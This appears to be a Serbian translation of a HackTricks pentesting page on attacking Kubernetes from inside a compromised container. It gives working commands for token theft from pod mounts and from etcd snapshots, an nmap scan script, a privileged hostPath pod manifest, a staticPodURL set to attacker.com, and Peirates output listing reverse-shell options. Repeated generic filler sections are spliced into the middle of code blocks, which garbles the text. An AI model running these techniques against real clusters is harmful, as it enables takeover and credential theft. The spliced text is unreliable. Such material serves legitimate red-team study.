# Napad na Kubernetes iznutra kontejnera

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili me **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## **Bekstvo iz kontejnera**

**Ako imate sreće, možda ćete moći da pobegnete iz njega na čvor:**

![](https://sickrov.github.io/media/Screenshot-161.jpg)

### Bekstvo iz kontejnera

Da biste pokušali da pobegnete iz kontejnera, možda ćete prvo morati da **povećate privilegije**, neke tehnike za to su:

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation" %}

Možete proveriti ove **docker bekstve da biste pokušali da pobegnete** iz kontejnera koji ste kompromitovali:

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout" %}

### Zloupotreba privilegija u Kubernetes-u

Kao što je objašnjeno u odeljku o **enumeraciji Kubernetes-a**:

{% content-ref url="kubernetes-enumeration.md" %}
[kubernetes-enumeration.md](kubernetes-enumeration.md)
{% endcontent-ref %}

Obično se kontejneri pokreću sa **tokenom servisnog naloga** unutar njih. Ovaj servisni nalog može imati neke **privelegije pridružene** koje biste mogli **zloupotrebiti** da biste se **premestili** na druge kontejnere ili čak **pobegli** na konfigurisane čvorove unutar klastera. Pogledajte kako u:

{% content-ref url="abusing-roles-clusterroles-in-kubernetes/" %}
[abusing-roles-clusterroles-in-kubernetes](abusing-roles-clusterroles-in-kubernetes/)
{% endcontent-ref %}

### Zloupotreba privilegija u oblaku

Ako se kontejner pokreće unutar **oblaka**, možda ćete moći da **procurite token sa metapodatkovnog endpointa** i povećate privilegije koristeći ga.

## Pretraga ranjivih mrežnih servisa

Kako se nalazite unutar Kubernetes okruženja, ako ne možete da povećate privilegije zloupotrebom trenutnih privilegija kontejnera i ne možete da pobegnete iz kontejnera, trebali biste **pretražiti potencijalno ranjive servise**.

### Servisi

**U tu svrhu, možete pokušati da dobijete sve servise Kubernetes okruženja:**
```
kubectl get svc --all-namespaces
```
Podrazumevano, Kubernetes koristi ravnu mrežnu šemu, što znači da **bilo koji pod/servis unutar klastera može komunicirati sa drugima**. **Namespace-ovi** unutar klastera **podrazumevano nemaju nikakva ograničenja mrežne sigurnosti**. Svako u namespace-u može komunicirati sa drugim namespace-ovima.

### Skeniranje

Sledeći Bash skript (preuzet sa [Kubernetes radionice](https://github.com/calinah/learn-by-hacking-kccn/blob/master/k8s\_cheatsheet.md)) će instalirati i skenirati IP opsege kubernetes klastera:
```bash
sudo apt-get update
sudo apt-get install nmap
nmap-kube ()
{
nmap --open -T4 -A -v -Pn -p 80,443,2379,8080,9090,9100,9093,4001,6782-6784,6443,8443,9099,10250,10255,10256 "${@}"
}

nmap-kube-discover () {
local LOCAL_RANGE=$(ip a | awk '/eth0$/{print $2}' | sed 's,[0-9][0-9]*/.*,*,');
local SERVER_RANGES=" ";
SERVER_RANGES+="10.0.0.1 ";
SERVER_RANGES+="10.0.1.* ";
SERVER_RANGES+="10.*.0-1.* ";
nmap-kube ${SERVER_RANGES} "${LOCAL_RANGE}"
}
nmap-kube-discover
```
Pogledajte sledeću stranicu da biste saznali kako možete **napasti specifične Kubernetes usluge** kako biste **ugrozili druge podove/celo okruženje**:

{% content-ref url="pentesting-kubernetes-services.md" %}
[pentesting-kubernetes-services.md](pentesting-kubernetes-services.md)
{% endcontent-ref %}

### Snifovanje

U slučaju da **ugroženi pod pokreće neku osetljivu uslugu** gde drugi podovi moraju da se autentifikuju, možda ćete moći da dobijete pristupnim podacima koji se šalju iz drugih podova **snifovanjem lokalnih komunikacija**.

## Mrežno falsifikovanje

Podrazumevano, tehnike poput **ARP falsifikovanja** (i zahvaljujući tome **DNS falsifikovanja**) funkcionišu u Kubernetes mreži. Zatim, unutar poda, ako imate **NET\_RAW mogućnost** (koja je podrazumevano dostupna), moći ćete da šaljete prilagođene mrežne pakete i izvodite **MitM napade putem ARP falsifikovanja na sve podove koji se izvršavaju na istom čvoru.**\
Osim toga, ako se **zlonamerni pod** izvršava na **istom čvoru kao DNS server**, moći ćete izvesti **DNS falsifikovanje napada na sve podove u klasteru**.

{% content-ref url="kubernetes-network-attacks.md" %}
[kubernetes-network-attacks.md](kubernetes-network-attacks.md)
{% endcontent-ref %}

## Node DoS

U Kubernetes manifestima nema specifikacije resursa i **nema primenjenih ograničenja** za kontejnere. Kao napadač, možemo **iskoristiti sve resurse na kojima se izvršava pod/deployment** i iscrpeti druge resurse, što može izazvati DoS za okruženje.

To se može uraditi pomoću alata kao što je [**stress-ng**](https://zoomadmin.com/HowToInstall/UbuntuPackage/stress-ng):
```
stress-ng --vm 2 --vm-bytes 2G --timeout 30s
```
Možete primetiti razliku dok pokrećete `stress-ng` i nakon toga.
```bash
kubectl --namespace big-monolith top pod hunger-check-deployment-xxxxxxxxxx-xxxxx
```
## Post-eksploatacija čvora

Ako ste uspeli da **izađete iz kontejnera**, pronaći ćete neke zanimljive stvari na čvoru:

* Proces **Container Runtime** (Docker)
* Više **pods/kontejnera** koji se izvršavaju na čvoru koje možete zloupotrebiti kao ovaj (više tokena)
* Ceo **fajl sistem** i **operativni sistem** uopšte
* Slušanje usluge **Kube-Proxy**
* Slušanje usluge **Kubelet**. Proverite konfiguracione fajlove:
* Direktorijum: `/var/lib/kubelet/`
* `/var/lib/kubelet/kubeconfig`
* `/var/lib/kubelet/kubelet.conf`
* `/var/lib/kubelet/config.yaml`
* `/var/lib/kubelet/kubeadm-flags.env`
* `/etc/kubernetes/kubelet-kubeconfig`
* Ostali **uobičajeni fajlovi Kubernetes-a**:
* `$HOME/.kube/config` - **Korisnička konfiguracija**
* `/etc/kubernetes/kubelet.conf`- **Redovna konfiguracija**
* `/etc/kubernetes/bootstrap-kubelet.conf` - **Konfiguracija za pokretanje**
* `/etc/kubernetes/manifests/etcd.yaml` - **etcd konfiguracija**
* `/etc/kubernetes/pki` - **Ključevi Kubernetes-a**

### Pronalaženje kubeconfig fajla čvora

Ako ne možete pronaći kubeconfig fajl na jednom od prethodno navedenih puteva, **proverite argument `--kubeconfig` procesa kubelet**:
```
ps -ef | grep kubelet
root        1406       1  9 11:55 ?        00:34:57 kubelet --cloud-provider=aws --cni-bin-dir=/opt/cni/bin --cni-conf-dir=/etc/cni/net.d --config=/etc/kubernetes/kubelet-conf.json --exit-on-lock-contention --kubeconfig=/etc/kubernetes/kubelet-kubeconfig --lock-file=/var/run/lock/kubelet.lock --network-plugin=cni --container-runtime docker --node-labels=node.kubernetes.io/role=k8sworker --volume-plugin-dir=/var/lib/kubelet/volumeplugin --node-ip 10.1.1.1 --hostname-override ip-1-1-1-1.eu-west-2.compute.internal
```
### Ukradi tajne

Da biste ukrali tajne unutar Kubernetes klastera, možete koristiti nekoliko tehnika:

1. **Pročitajte tajne iz API servera**: Koristite API za pristup tajnama koje su sačuvane u Kubernetes klasteru. Možete koristiti `kubectl` komandu ili API klijent za pristup tajnama.

2. **Istražite konfiguraciju**: Pregledajte konfiguracijske datoteke i manifeste kako biste pronašli tajne. Ove datoteke mogu sadržavati osetljive informacije kao što su lozinke, ključevi API-ja ili sertifikati.

3. **Istražite podatke u skladištu**: Proverite da li postoje osetljivi podaci sačuvani u skladištu podataka, kao što su baze podataka ili objektni skladišta. Možete koristiti alate kao što su `kubectl exec` ili `kubectl port-forward` za pristup podacima unutar kontejnera.

4. **Istražite mrežu**: Analizirajte mrežni saobraćaj unutar klastera kako biste pronašli tajne. Možete koristiti alate kao što su `tcpdump` ili `Wireshark` za snimanje i analizu mrežnog saobraćaja.

Važno je napomenuti da je krađa tajni ilegalna i može imati ozbiljne pravne posledice. Ove tehnike se trebaju koristiti samo u okviru zakona i etičkih smernica.
```bash
# Check Kubelet privileges
kubectl --kubeconfig /var/lib/kubelet/kubeconfig auth can-i create pod -n kube-system

# Steal the tokens from the pods running in the node
# The most interesting one is probably the one of kube-system
ALREADY="IinItialVaaluE"
for i in $(mount | sed -n '/secret/ s/^tmpfs on \(.*default.*\) type tmpfs.*$/\1\/namespace/p'); do
TOKEN=$(cat $(echo $i | sed 's/.namespace$/\/token/'))
if ! [ $(echo $TOKEN | grep -E $ALREADY) ]; then
ALREADY="$ALREADY|$TOKEN"
echo "Directory: $i"
echo "Namespace: $(cat $i)"
echo ""
echo $TOKEN
echo "================================================================================"
echo ""
fi
done
```
Skripta [**can-they.sh**](https://github.com/BishopFox/badPods/blob/main/scripts/can-they.sh) automatski će **dobiti tokene drugih podova i proveriti da li imaju traženu dozvolu** (umesto da vi gledate jedan po jedan):
```bash
./can-they.sh -i "--list -n default"
./can-they.sh -i "list secrets -n kube-system"// Some code
```
### Privilegovani DaemonSetovi

DaemonSet je **pod** koji će biti **pokrenut** na **svim čvorovima klastera**. Dakle, ako je DaemonSet konfigurisan sa **privilegovanim servisnim nalogom**, na **SVIM čvorovima** ćete moći pronaći **token** tog **privilegovanog servisnog naloga** koji biste mogli zloupotrebiti.

Eksploatacija je ista kao i u prethodnom odeljku, ali sada ne zavisite od sreće.

### Prelazak na Cloud

Ako je klaster upravljan od strane cloud servisa, obično **čvor će imati drugačiji pristup metadata endpointu** od Pod-a. Stoga, pokušajte **pristupiti metadata endpointu sa čvora** (ili iz pod-a sa hostNetwork postavljenim na True):

{% content-ref url="kubernetes-pivoting-to-clouds.md" %}
[kubernetes-pivoting-to-clouds.md](kubernetes-pivoting-to-clouds.md)
{% endcontent-ref %}

### Krađa etcd-a

Ako možete specificirati [**nodeName**](https://kubernetes.io/docs/tasks/configure-pod-container/assign-pods-nodes/#create-a-pod-that-gets-scheduled-to-specific-node) čvora na kojem će se pokrenuti kontejner, dobijte shell unutar kontrolne tačke čvora i preuzmite **etcd bazu podataka**:
```
kubectl get nodes
NAME                STATUS   ROLES    AGE   VERSION
k8s-control-plane   Ready    master   93d   v1.19.1
k8s-worker          Ready    <none>   93d   v1.19.1
```
Kontrolni čvorovi imaju ulogu **mastera** i u **upravljanim klasterima u oblaku nećete moći pokrenuti ništa na njima**.

#### Čitanje tajni iz etcd-a

Ako možete pokrenuti svoj pod na kontrolnom čvoru koristeći selektor `nodeName` u specifikaciji poda, možete lako pristupiti bazi podataka `etcd`, koja sadrži sve konfiguracije klastera, uključujući sve tajne informacije.

U nastavku je brz i prljav način za dobijanje tajnih informacija iz `etcd`-a ako se pokreće na kontrolnom čvoru na kojem se nalazite. Ako želite elegantnije rešenje koje pokreće pod sa `etcd` klijentskim alatom `etcdctl` i koristi akreditive kontrolnog čvora za povezivanje sa etcd-om, bez obzira gde se on izvršava, pogledajte [ovaj primer manifesta](https://github.com/mauilion/blackhat-2019/blob/master/etcd-attack/etcdclient.yaml) od @mauilion.

**Proverite da li se `etcd` izvršava na kontrolnom čvoru i vidite gde se nalazi baza podataka (Ovo je na klasteru kreiranom pomoću `kubeadm`-a)**
```
root@k8s-control-plane:/var/lib/etcd/member/wal# ps -ef | grep etcd | sed s/\-\-/\\n/g | grep data-dir
```
# Napad na Kubernetes iznutra kontejnera

U Kubernetes okruženju, kada se nalazite unutar kontejnera, postoji nekoliko načina da izvršite napad na sam Kubernetes klaster. Ovi napadi se mogu izvesti kroz različite ranjivosti i slabosti u konfiguraciji klastera.

## 1. Napad na API server

API server je centralni deo Kubernetes klastera i omogućava komunikaciju između različitih komponenti klastera. Napad na API server može biti izvršen kroz različite metode kao što su:

- Korišćenje kradenih ili kompromitovanih tokena za autentifikaciju
- Iskorišćavanje ranjivosti u verziji API servera
- Korišćenje privilegija kontejnera za pristup API serveru

## 2. Napad na mrežu klastera

Kubernetes klaster koristi mrežu za komunikaciju između različitih komponenti. Napad na mrežu klastera može biti izvršen kroz različite metode kao što su:

- Snimanje mrežnog saobraćaja unutar klastera radi presretanja osetljivih podataka
- Iskorišćavanje ranjivosti u mrežnoj konfiguraciji klastera
- Korišćenje ARP spoofinga za preusmeravanje mrežnog saobraćaja

## 3. Napad na resurse klastera

Kubernetes klaster koristi resurse kao što su CPU, memorija i skladište za izvršavanje kontejnera. Napad na resurse klastera može biti izvršen kroz različite metode kao što su:

- Iskorišćavanje slabosti u konfiguraciji resursa klastera radi preopterećenja sistema
- Korišćenje privilegija kontejnera za pristup i menjanje resursa klastera
- Korišćenje ranjivosti u sistemu za upravljanje resursima klastera

## 4. Napad na druge kontejnere

U Kubernetes klasteru, kontejneri dele isti host i mrežu. Napad na druge kontejnere može biti izvršen kroz različite metode kao što su:

- Korišćenje ranjivosti u kontejnerima za izvršavanje napada na druge kontejnere
- Korišćenje privilegija kontejnera za pristup i manipulaciju drugim kontejnerima
- Korišćenje slabosti u izolaciji kontejnera za presretanje osetljivih podataka

## 5. Napad na host sistem

Kubernetes klaster deli host sistem sa kontejnerima. Napad na host sistem može biti izvršen kroz različite metode kao što su:

- Korišćenje ranjivosti u host sistemu za pristup i manipulaciju hostom
- Korišćenje privilegija kontejnera za pristup host sistemu
- Korišćenje slabosti u izolaciji host sistema za presretanje osetljivih podataka

## 6. Napad na druge servise

Kubernetes klaster može imati i druge servise koji nisu deo samog klastera. Napad na druge servise može biti izvršen kroz različite metode kao što su:

- Korišćenje ranjivosti u drugim servisima za izvršavanje napada
- Korišćenje privilegija kontejnera za pristup i manipulaciju drugim servisima
- Korišćenje slabosti u konfiguraciji drugih servisa za presretanje osetljivih podataka
```bash
data-dir=/var/lib/etcd
```
**Pregledajte podatke u etcd bazi podataka:**

```bash
kubectl exec -it <pod_name> -- sh
ETCDCTL_API=3 etcdctl get --prefix "" --keys-only --from-key / --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt --cert /var/run/secrets/kubernetes.io/serviceaccount/tls.crt --key /var/run/secrets/kubernetes.io/serviceaccount/tls.key | grep -v '\/$'
```

Ovom komandom možete pregledati podatke u etcd bazi podataka. Zamijenite `<pod_name>` sa imenom ciljanog poda.
```bash
strings /var/lib/etcd/member/snap/db | less
```
**Izvucite tokene iz baze podataka i prikažite ime servisnog naloga**
```bash
db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done
```
**Ista komanda, ali sa nekoliko grepa da bi se vratio samo podrazumevani token u kube-system namespace-u**
```bash
db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done | grep kube-system | grep default
```
# Napad na Kubernetes iznutra kontejnera

U Kubernetes okruženju, kada se nalazite unutar kontejnera, postoji nekoliko načina da izvršite napad na sam Kubernetes klaster. Ovi napadi se mogu izvesti kroz različite ranjivosti i slabosti u konfiguraciji klastera.

## 1. Napad na API server

API server je centralni deo Kubernetes klastera i omogućava komunikaciju između različitih komponenti. Napad na API server može biti izvršen kroz različite metode kao što su:

- Korišćenje kradenih ili kompromitovanih tokena za autentifikaciju
- Iskorišćavanje ranjivosti u verziji API servera
- Korišćenje privilegija kontejnera za pristup API serveru

## 2. Napad na mrežu

Kubernetes klaster koristi mrežu za komunikaciju između različitih komponenti. Napad na mrežu može biti izvršen kroz različite metode kao što su:

- Snimanje mrežnog saobraćaja unutar klastera
- Iskorišćavanje ranjivosti u mrežnoj konfiguraciji klastera
- Korišćenje ARP spoofinga za presretanje mrežnog saobraćaja

## 3. Napad na skladište podataka

Kubernetes koristi skladište podataka za čuvanje informacija o klasteru. Napad na skladište podataka može biti izvršen kroz različite metode kao što su:

- Korišćenje privilegija kontejnera za pristup skladištu podataka
- Iskorišćavanje ranjivosti u konfiguraciji skladišta podataka
- Korišćenje SQL injekcije za pristup podacima u skladištu

## 4. Napad na druge kontejnere

U Kubernetes klasteru, kontejneri mogu biti izvršeni na istom čvoru i deliti iste resurse. Napad na druge kontejnere može biti izvršen kroz različite metode kao što su:

- Korišćenje privilegija kontejnera za pristup drugim kontejnerima
- Iskorišćavanje ranjivosti u konfiguraciji kontejnera
- Korišćenje napada na memoriju za pristup podacima drugih kontejnera

## 5. Napad na host sistem

Kada se nalazite unutar kontejnera, imate mogućnost da izvršite napad na host sistem. Napad na host sistem može biti izvršen kroz različite metode kao što su:

- Korišćenje privilegija kontejnera za pristup host sistemu
- Iskorišćavanje ranjivosti u konfiguraciji host sistema
- Korišćenje napada na operativni sistem za pristup host sistemu

## Zaključak

Napadi na Kubernetes klaster iznutra kontejnera mogu biti izvršeni kroz različite ranjivosti i slabosti u konfiguraciji klastera. Važno je da administratori klastera preduzmu odgovarajuće mere zaštite kako bi sprečili ove napade i održali sigurnost klastera.
```
1/registry/secrets/kube-system/default-token-d82kb | eyJhbGciOiJSUzI1NiIsImtpZCI6IkplRTc0X2ZP[REDACTED]
```
### Statička/Mirrored Pods upornost

_Statički Pods_ se upravljaju direktno od strane kubelet demona na određenom čvoru, bez nadgledanja API servera. Za razliku od Pods koji se upravljaju kontrolnom ravni (na primer, Deployment); umesto toga, **kubelet nadgleda svaki statički Pod** (i ponovo ga pokreće ako ne uspe).

Stoga, statički Pods su uvek **vezani za jedan Kubelet** na određenom čvoru.

**kubelet automatski pokušava da kreira Mirror Pod na Kubernetes API serveru** za svaki statički Pod. Ovo znači da su Podovi koji se izvršavaju na čvoru vidljivi na API serveru, ali se ne mogu kontrolisati odatle. Imena Podova će biti sufiksirana sa imenom čvora sa vodećim crticom.

{% hint style="danger" %}
**`spec` statičkog Pod-a ne može se odnositi na druge API objekte** (npr. ServiceAccount, ConfigMap, Secret, itd. Dakle, **ne možete zloupotrebiti ovu funkcionalnost da biste pokrenuli Pod sa proizvoljnim serviceAccount-om** na trenutnom čvoru kako biste kompromitovali klaster. Ali možete koristiti ovo da biste pokrenuli Podove u različitim namespace-ima (ako je to korisno iz nekog razloga).
{% endhint %}

Ako se nalazite unutar čvora domaćina, možete ga naterati da kreira **statički Pod unutar sebe**. Ovo je veoma korisno jer vam može omogućiti da **kreirate Pod u drugom namespace-u** kao što je **kube-system**.

Da biste kreirali statički Pod, [**dokumentacija je od velike pomoći**](https://kubernetes.io/docs/tasks/configure-pod-container/static-pod/). U osnovi, potrebne su vam 2 stvari:

* Konfigurišite parametar **`--pod-manifest-path=/etc/kubernetes/manifests`** u **kubelet servisu**, ili u **kubelet konfiguraciji** ([**staticPodPath**](https://kubernetes.io/docs/reference/config-api/kubelet-config.v1beta1/#kubelet-config-k8s-io-v1beta1-KubeletConfiguration)) i ponovo pokrenite servis
* Kreirajte definiciju na **definiciji Pod-a** u **`/etc/kubernetes/manifests`**

**Još jedan način koji je diskretniji bi bio:**

* Izmenite parametar **`staticPodURL`** iz konfiguracione datoteke **kubelet-a** i postavite nešto poput `staticPodURL: http://attacker.com:8765/pod.yaml`. Ovo će naterati kubelet proces da kreira **statički Pod** dobijajući **konfiguraciju sa naznačene URL adrese**.

**Primer** konfiguracije **Pod-a** za kreiranje privilegovanih Pod-ova u **kube-system** preuzet sa [**ovde**](https://research.nccgroup.com/2020/02/12/command-and-kubectl-talk-follow-up/):
```yaml
apiVersion: v1
kind: Pod
metadata:
name: bad-priv2
namespace: kube-system
spec:
containers:
- name: bad
hostPID: true
image: gcr.io/shmoocon-talk-hacking/brick
stdin: true
tty: true
imagePullPolicy: IfNotPresent
volumeMounts:
- mountPath: /chroot
name: host
securityContext:
privileged: true
volumes:
- name: host
hostPath:
path: /
type: Directory
```
### Brisanje podova + nepodesivi čvorovi

Ako napadač **preuzme kontrolu nad čvorom** i može **brisati podove** sa drugih čvorova i **onemogućiti izvršavanje podova na drugim čvorovima**, podovi će biti ponovno pokrenuti na preuzetom čvoru i napadač će moći **ukrasti token** koji se izvršava u njima.\
Za [**više informacija pratite ove veze**](abusing-roles-clusterroles-in-kubernetes/#delete-pods-+-unschedulable-nodes).

## Automatski alati

* [**https://github.com/inguardians/peirates**](https://github.com/inguardians/peirates)
```
Peirates v1.1.8-beta by InGuardians
https://www.inguardians.com/peirates
----------------------------------------------------------------
[+] Service Account Loaded: Pod ns::dashboard-56755cd6c9-n8zt9
[+] Certificate Authority Certificate: true
[+] Kubernetes API Server: https://10.116.0.1:443
[+] Current hostname/pod name: dashboard-56755cd6c9-n8zt9
[+] Current namespace: prd
----------------------------------------------------------------
Namespaces, Service Accounts and Roles |
---------------------------------------+
[1] List, maintain, or switch service account contexts [sa-menu]  (try: listsa *, switchsa)
[2] List and/or change namespaces [ns-menu] (try: listns, switchns)
[3] Get list of pods in current namespace [list-pods]
[4] Get complete info on all pods (json) [dump-pod-info]
[5] Check all pods for volume mounts [find-volume-mounts]
[6] Enter AWS IAM credentials manually [enter-aws-credentials]
[7] Attempt to Assume a Different AWS Role [aws-assume-role]
[8] Deactivate assumed AWS role [aws-empty-assumed-role]
[9] Switch authentication contexts: certificate-based authentication (kubelet, kubeproxy, manually-entered) [cert-menu]
-------------------------+
Steal Service Accounts   |
-------------------------+
[10] List secrets in this namespace from API server [list-secrets]
[11] Get a service account token from a secret [secret-to-sa]
[12] Request IAM credentials from AWS Metadata API [get-aws-token] *
[13] Request IAM credentials from GCP Metadata API [get-gcp-token] *
[14] Request kube-env from GCP Metadata API [attack-kube-env-gcp]
[15] Pull Kubernetes service account tokens from kops' GCS bucket (Google Cloudonly) [attack-kops-gcs-1]  *
[16] Pull Kubernetes service account tokens from kops' S3 bucket (AWS only) [attack-kops-aws-1]
--------------------------------+
Interrogate/Abuse Cloud API's   |
--------------------------------+
[17] List AWS S3 Buckets accessible (Make sure to get credentials via get-aws-token or enter manually) [aws-s3-ls]
[18] List contents of an AWS S3 Bucket (Make sure to get credentials via get-aws-token or enter manually) [aws-s3-ls-objects]
-----------+
Compromise |
-----------+
[20] Gain a reverse rootshell on a node by launching a hostPath-mounting pod [attack-pod-hostpath-mount]
[21] Run command in one or all pods in this namespace via the API Server [exec-via-api]
[22] Run a token-dumping command in all pods via Kubelets (authorization permitting) [exec-via-kubelet]
-------------+
Node Attacks |
-------------+
[30] Steal secrets from the node filesystem [nodefs-steal-secrets]
-----------------+
Off-Menu         +
-----------------+
[90] Run a kubectl command using the current authorization context [kubectl [arguments]]
[] Run a kubectl command using EVERY authorization context until one works [kubectl-try-all [arguments]]
[91] Make an HTTP request (GET or POST) to a user-specified URL [curl]
[92] Deactivate "auth can-i" checking before attempting actions [set-auth-can-i]
[93] Run a simple all-ports TCP port scan against an IP address [tcpscan]
[94] Enumerate services via DNS [enumerate-dns] *
[]  Run a shell command [shell <command and arguments>]

[exit] Exit Peirates
```
* [**https://github.com/r0binak/MTKPI**](https://github.com/r0binak/MTKPI)

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** me na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
